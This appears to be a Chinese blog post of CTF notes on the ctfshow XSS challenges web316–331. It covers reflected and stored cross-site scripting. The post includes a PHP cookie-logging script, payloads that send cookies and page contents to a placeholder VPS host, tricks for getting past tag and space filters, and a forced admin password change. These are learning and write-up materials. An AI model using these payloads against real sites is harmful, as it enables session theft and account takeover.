@@ -1,0 +1,437 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="XSS - 反射型XSSweb316 - XSS带出cookie直接输入&lt;script&gt;alert%281%29&lt;%2Fscript&gt;成功弹窗。 之后就不知道该怎么办了，于是看wp1和wp2。 ceye老是崩，就用xss平台。 查看我们浏览器的cookie，有一个flag字段。但现在显示you%20are%20not%20admin%20no%20flag。需要admin。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ctfshow-web入门笔记-xss入门">
+<meta property="og:url" content="http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-xss%E5%85%A5%E9%97%A8/index.html">
+<meta property="og:site_name" content="ShuiChang厕纸博客站">
+<meta property="og:description" content="XSS - 反射型XSSweb316 - XSS带出cookie直接输入&lt;script&gt;alert%281%29&lt;%2Fscript&gt;成功弹窗。 之后就不知道该怎么办了，于是看wp1和wp2。 ceye老是崩，就用xss平台。 查看我们浏览器的cookie，有一个flag字段。但现在显示you%20are%20not%20admin%20no%20flag。需要admin。">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2024-05-04T16:18:23.000Z">
+<meta property="article:modified_time" content="2024-05-04T16:18:51.388Z">
+<meta property="article:author" content="ShuiChang">
+<meta property="article:tag" content="web学习">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>ctfshow-web入门笔记-xss入门</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a href="/friends/">friends</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/ShuiChang2019">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-xxe%E5%85%A5%E9%97%A8/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-Java%E5%85%A5%E9%97%A8/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-xss%E5%85%A5%E9%97%A8/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-xss%E5%85%A5%E9%97%A8/&text=ctfshow-web入门笔记-xss入门"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-xss%E5%85%A5%E9%97%A8/&title=ctfshow-web入门笔记-xss入门"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-xss%E5%85%A5%E9%97%A8/&is_video=false&description=ctfshow-web入门笔记-xss入门"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ctfshow-web入门笔记-xss入门&body=Check out this article: http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-xss%E5%85%A5%E9%97%A8/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-xss%E5%85%A5%E9%97%A8/&title=ctfshow-web入门笔记-xss入门"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-xss%E5%85%A5%E9%97%A8/&title=ctfshow-web入门笔记-xss入门"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-xss%E5%85%A5%E9%97%A8/&title=ctfshow-web入门笔记-xss入门"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-xss%E5%85%A5%E9%97%A8/&title=ctfshow-web入门笔记-xss入门"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-xss%E5%85%A5%E9%97%A8/&name=ctfshow-web入门笔记-xss入门&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-xss%E5%85%A5%E9%97%A8/&t=ctfshow-web入门笔记-xss入门"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS-%E5%8F%8D%E5%B0%84%E5%9E%8BXSS"><span class="toc-number">1.</span> <span class="toc-text">XSS - 反射型XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web316-XSS%E5%B8%A6%E5%87%BAcookie"><span class="toc-number">1.1.</span> <span class="toc-text">web316 - XSS带出cookie</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web317-XSS%E8%BF%87%E6%BB%A4%E6%A0%87%E7%AD%BE"><span class="toc-number">1.2.</span> <span class="toc-text">web317 - XSS过滤&lt;script&gt;标签</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web318"><span class="toc-number">1.3.</span> <span class="toc-text">web318</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web319"><span class="toc-number">1.4.</span> <span class="toc-text">web319</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web320-XSS%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC"><span class="toc-number">1.5.</span> <span class="toc-text">web320 - XSS过滤空格</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="toc-number">1.5.1.</span> <span class="toc-text">XSS空格过滤的绕过方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web321"><span class="toc-number">1.6.</span> <span class="toc-text">web321</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web322-%E8%BF%87%E6%BB%A4xss%E5%AD%97%E7%AC%A6"><span class="toc-number">1.7.</span> <span class="toc-text">web322 - 过滤xss字符</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web323"><span class="toc-number">1.8.</span> <span class="toc-text">web323</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web324"><span class="toc-number">1.9.</span> <span class="toc-text">web324</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web325"><span class="toc-number">1.10.</span> <span class="toc-text">web325</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web326"><span class="toc-number">1.11.</span> <span class="toc-text">web326</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS-%E5%AD%98%E5%82%A8%E5%9E%8BXSS"><span class="toc-number">2.</span> <span class="toc-text">XSS - 存储型XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web327"><span class="toc-number">2.1.</span> <span class="toc-text">web327</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web328"><span class="toc-number">2.2.</span> <span class="toc-text">web328</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web329"><span class="toc-number">2.3.</span> <span class="toc-text">web329</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web330"><span class="toc-number">2.4.</span> <span class="toc-text">web330</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%A1%88%E4%B8%80%EF%BC%9A%E7%9B%B4%E6%8E%A5%E8%AF%BB%E7%BD%91%E9%A1%B5"><span class="toc-number">2.4.1.</span> <span class="toc-text">方案一：直接读网页</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%A1%88%E4%BA%8C%EF%BC%9A%E4%BF%AE%E6%94%B9%E5%AF%86%E7%A0%81"><span class="toc-number">2.4.2.</span> <span class="toc-text">方案二：修改密码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web331"><span class="toc-number">2.5.</span> <span class="toc-text">web331</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web332"><span class="toc-number">2.6.</span> <span class="toc-text">web332</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web333"><span class="toc-number">2.7.</span> <span class="toc-text">web333</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        ctfshow-web入门笔记-xss入门
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">ShuiChang</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-05-04T16:18:23.000Z" class="dt-published" itemprop="datePublished">2024-05-05</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/web%E5%AD%A6%E4%B9%A0/" rel="tag">web学习</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="XSS-反射型XSS"><a href="#XSS-反射型XSS" class="headerlink" title="XSS - 反射型XSS"></a>XSS - 反射型XSS</h1><h2 id="web316-XSS带出cookie"><a href="#web316-XSS带出cookie" class="headerlink" title="web316 - XSS带出cookie"></a>web316 - XSS带出cookie</h2><p>直接输入<code>&lt;script&gt;alert%281%29&lt;%2Fscript&gt;</code>成功弹窗。</p>
+<p>之后就不知道该怎么办了，于是看<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42880719/article/details/122543274">wp1</a>和<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_62584974/article/details/124029430">wp2</a>。</p>
+<p><a target="_blank" rel="noopener" href="https://ceye.io/">ceye</a>老是崩，就用<a target="_blank" rel="noopener" href="https://xss.pt/">xss平台</a>。</p>
+<p>查看我们浏览器的cookie，有一个<code>flag</code>字段。但现在显示<code>you%20are%20not%20admin%20no%20flag</code>。需要admin。</p>
+<p>xss平台试了好几个链接，均失败了。</p>
+<p>尝试vps搭建。偷了<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_62584974/article/details/124029430">wp2</a>的脚本</p>
+<p>xss_cookie.php：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$cookie</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>];</span><br><span class="line">    <span class="variable">$log</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;cookie.txt&quot;</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$log</span>, <span class="variable">$cookie</span> . <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$log</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后启动服务<code>php -S 0.0.0.0:9999</code></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&quot;http://vps_ip:vps_port/xss_cookie.php?cookie=&quot;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>服务器得到flag。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> cookie.txt </span><br><span class="line">PHPSESSID=t20m79g75694bi8cbdbpj00kug; flag=you are not admin no flag</span><br><span class="line">PHPSESSID=ecfuu4i9sslj0pk2duh0m37qut; flag=ctfshow&#123;fa1db6ee-1639-49cc-94b7-f0798b79182d&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="web317-XSS过滤标签"><a href="#web317-XSS过滤标签" class="headerlink" title="web317 - XSS过滤&lt;script&gt;标签"></a>web317 - XSS过滤<code>&lt;script&gt;</code>标签</h2><p>直接用上面的脚本即可，过滤了<code>&lt;script&gt;</code>标签，因为双写、大小写和URL编码均没绕过</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">&quot;window.open(&#x27;http://vps_ip:vps_port/xss_cookie.php?cookie=&#x27;+document.cookie)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>服务器得到flag。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PHPSESSID=3sc2o2tekiotgb4ojvnt203i5u; flag=ctfshow&#123;02344f21-8e12-4671-80a4-f29bfcbbd86d&#125;</span><br><span class="line">PHPSESSID=06j3fmrvif2cvfqgq7srruc4pe; flag=ctfshow&#123;02344f21-8e12-4671-80a4-f29bfcbbd86d&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="web318"><a href="#web318" class="headerlink" title="web318"></a>web318</h2><p>同上</p>
+<h2 id="web319"><a href="#web319" class="headerlink" title="web319"></a>web319</h2><p>同上</p>
+<h2 id="web320-XSS过滤空格"><a href="#web320-XSS过滤空格" class="headerlink" title="web320 - XSS过滤空格"></a>web320 - XSS过滤空格</h2><p>又过滤了什么东西。但是懒得用Burpsuite进行<code>http://df25002b-cb35-4a60-acb1-6269573d1c35.challenge.ctf.show/?msg=</code>后面的msg单字符爆破了。</p>
+<p>从<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42880719/article/details/122543274">wp</a>处学到了二分式查找过滤内容的方法。即，先切半，然后一半半排除过滤内容。</p>
+<p>最后发现，所过滤的字符是空格。绕过空格过滤即可。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body/**/onload=&quot;window.open(&#x27;http://vps_ip:vps_port/xss_cookie.php?cookie=&#x27;+document.cookie)&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>或者</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body/onload=&quot;window.open(&#x27;http://vps_ip:vps_port/xss_cookie.php?cookie=&#x27;+document.cookie)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="XSS空格过滤的绕过方法"><a href="#XSS空格过滤的绕过方法" class="headerlink" title="XSS空格过滤的绕过方法"></a>XSS空格过滤的绕过方法</h3><ul>
+<li><code>/**/</code></li>
+<li><code>/</code></li>
+</ul>
+<h2 id="web321"><a href="#web321" class="headerlink" title="web321"></a>web321</h2><p>同上</p>
+<h2 id="web322-过滤xss字符"><a href="#web322-过滤xss字符" class="headerlink" title="web322 - 过滤xss字符"></a>web322 - 过滤<code>xss</code>字符</h2><p>这题在上面的基础上加入了对<code>xss</code>的过滤。这只能靠“二分法”弄出来，如果是burpsuite单字fuzz是没办法完全凑齐<code>xss</code>三个字的。</p>
+<p>修改服务器脚本名即可。这里修改为<code>temp_cookie.php</code>。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body/onload=&quot;window.open(&#x27;http://vps_ip:vps_port/temp_cookie.php?cookie=&#x27;+document.cookie)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="web323"><a href="#web323" class="headerlink" title="web323"></a>web323</h2><p>同上</p>
+<h2 id="web324"><a href="#web324" class="headerlink" title="web324"></a>web324</h2><p>同上</p>
+<h2 id="web325"><a href="#web325" class="headerlink" title="web325"></a>web325</h2><p>同上</p>
+<h2 id="web326"><a href="#web326" class="headerlink" title="web326"></a>web326</h2><p>同上</p>
+<h1 id="XSS-存储型XSS"><a href="#XSS-存储型XSS" class="headerlink" title="XSS - 存储型XSS"></a>XSS - 存储型XSS</h1><h2 id="web327"><a href="#web327" class="headerlink" title="web327"></a>web327</h2><p><a target="_blank" rel="noopener" href="https://galiyy.github.io/2019/10/01/%E5%AD%98%E5%82%A8%E5%9E%8BXSS%E6%BC%8F%E6%B4%9E/">储存型XSS</a></p>
+<blockquote>
+<p>存储型XSS，也叫持久型XSS，主要是将XSS代码发送到服务器（不管是数据库、内存还是文件系统等。），然后在下次请求页面的时候就不用带上XSS代码了。最典型的就是留言板XSS。用户提交了一条包含XSS代码的留言到数据库。当目标用户查询留言时，那些留言的内容会从服务器解析之后加载出来。浏览器发现有XSS代码，就当做正常的HTML和JS解析执行。XSS攻击就发生了。</p>
+</blockquote>
+<p>这里把发件人和收件人都填admin，然后内容填xss payload即可。</p>
+<p>点击发送，会POST到<code>https://bb718a43-77d9-4b3a-9348-5348f080fdcb.challenge.ctf.show/mail.php</code></p>
+<p>同时服务器收到请求，获取cookie。</p>
+<h2 id="web328"><a href="#web328" class="headerlink" title="web328"></a>web328</h2><p>有注册登录页面，先注册一个，然后偷管理员cookie。</p>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/51801f145573">这个wp</a>说的相当清楚。首先，用户列表会显示用户名和密码（密码目前未知是明文），所以可以：</p>
+<ol>
+<li>将用户名设为存储型XSS的Payload；</li>
+<li>当admin访问用户名页面时，被XSS攻击，其session或cookie被偷走，发到攻击者的服务器上；</li>
+<li>攻击者利用已经获得的session或cookie登录，查看到所有人的用户名和密码。</li>
+</ol>
+<p>在这道题里，就是使用XSS偷admin的session，再通过这个session认证<code>/api/?page=1&amp;limit=10</code>这个api。这样就能得到admin账密了。</p>
+<p>payload:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&#x27;http://vps_ip:vps_port/temp_cookie.php?cookie=&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="web329"><a href="#web329" class="headerlink" title="web329"></a>web329</h2><p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/51801f145573">wp</a>发现admin的session会变，当拿到时已经过期了。所以提出了让注入的XSS直接将页面的元素发送到攻击者服务器上。</p>
+<p>目前尝试了三种把所有页面内容发到服务器上的payload：</p>
+<p>innerHTML</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&#x27;http://vps_ip:vps_port/xss_get_page.php?innerHTML=&#x27;</span>+<span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">innerHTML</span>&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>outerHTML</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&#x27;http://vps_ip:vps_port/xss_get_page.php?innerHTML=&#x27;</span>+<span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="property">outerHTML</span>&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>head+body</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&#x27;http://vps_ip:vps_port/xss_get_full_page.php?headHTML=&#x27;</span>+<span class="variable language_">document</span>.<span class="property">head</span>.<span class="property">outerHTML</span>+<span class="string">&#x27;&amp;bodyHTML=&#x27;</span>+<span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">outerHTML</span>&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>均告失败。wp采用了<code>querySelector()</code>对密码行进行了搜寻。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;$(<span class="string">&#x27;.laytable-cell-1-0-1&#x27;</span>).<span class="title function_">each</span>(<span class="keyword">function</span>(<span class="params">index,value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(value.<span class="property">innerHTML</span>.<span class="title function_">indexOf</span>(<span class="string">&#x27;ctf&#x27;</span>+<span class="string">&#x27;show&#x27;</span>)&gt;-<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&#x27;http://vps_ip:vps_port?cookie=&#x27;</span>+value.<span class="property">innerHTML</span>; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>得到admin的密码“ctfshowdacaiji”。登录即得flag。</p>
+<h2 id="web330"><a href="#web330" class="headerlink" title="web330"></a>web330</h2><h3 id="方案一：直接读网页"><a href="#方案一：直接读网页" class="headerlink" title="方案一：直接读网页"></a>方案一：直接读网页</h3><p>在上一道题没有读出所有网页内容后，看了<a target="_blank" rel="noopener" href="https://yq1ng.github.io/2020/12/21/ctfshow-xss-zhuan-ti/">wp</a>中的这个方法：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#top &gt; div.layui-container&#x27;</span>).<span class="property">textContent</span>;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>这段代码使用<code>querySelector()</code>方法选择了ID为<code>top</code>的元素下的第一个div元素，并且其类名为<code>layui-container</code>，然后使用<code>.textContent</code>属性获取了该元素的文本内容。</p>
+</blockquote>
+<blockquote>
+<p>具体来说，它获取了ID为top的元素下的第一个div元素（即<code>&lt;div class=&quot;layui-container&quot;&gt;</code>），并返回了该div元素的所有文本内容。这将返回该div元素及其所有子元素的文本内容，不包括HTML标签。</p>
+</blockquote>
+<blockquote>
+<p>如果#top下有多个div元素，此代码将返回第一个匹配的div元素的文本内容。</p>
+</blockquote>
+<h3 id="方案二：修改密码"><a href="#方案二：修改密码" class="headerlink" title="方案二：修改密码"></a>方案二：修改密码</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&#x27;http://127.0.0.1/api/change.php?p=123&#x27;</span>;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>给本机发请求修改admin密码。</p>
+<h2 id="web331"><a href="#web331" class="headerlink" title="web331"></a>web331</h2><p>直接读网页依旧可行；这里的修改密码的api还是<code>/api/change.php</code>，但方法变成了post。ajax的注入可以参考网页的js代码。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">layui.<span class="title function_">use</span>(<span class="string">&#x27;form&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">var</span> form = layui.<span class="property">form</span>;</span><br><span class="line">  form.<span class="title function_">on</span>(<span class="string">&#x27;submit(formChange)&#x27;</span>, <span class="keyword">function</span>(<span class="params">data</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> newpass = data.<span class="property">field</span>[<span class="string">&#x27;p&#x27;</span>];</span><br><span class="line">    </span><br><span class="line">    $.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">      <span class="attr">url</span>:<span class="string">&#x27;api/change.php&#x27;</span>,</span><br><span class="line">      <span class="attr">type</span>:<span class="string">&#x27;post&#x27;</span>,</span><br><span class="line">      <span class="attr">data</span>:&#123;</span><br><span class="line">        <span class="attr">p</span>:newpass</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">success</span>:<span class="keyword">function</span>(<span class="params">data</span>)&#123;</span><br><span class="line">        layer.<span class="title function_">msg</span>(data);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>; </span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<p>payload:</p>
